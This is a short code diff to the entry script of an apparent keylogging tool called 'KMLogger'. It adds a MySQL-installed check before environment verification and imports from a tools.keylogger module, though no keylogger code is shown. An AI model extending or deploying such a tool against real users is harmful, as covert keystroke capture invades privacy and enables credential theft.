@@ -1,17 +1,19 @@
 import os
-from base.sql import SQLDriver
+from base.sql import SQLDriver, check_mysql_installed
 from base.user import add_user, display_profile
 from base.util import *
 from base.log import Logger
 from tools.keylogger import *
 from tools.env_verifier import verify_env_values
 from dotenv import load_dotenv
+
 if __name__ == '__main__':
     log = Logger("cli")
     clear_screen()
-    verify_env_values()
-    input("Press any key to continue ")
-    clear_screen()
+    if(check_mysql_installed() == True):
+        verify_env_values()
+        input("Press any key to continue ")
+        clear_screen()
     banner("KMLogger")
     load_dotenv()
     print("\nChoose service you want to use : ")
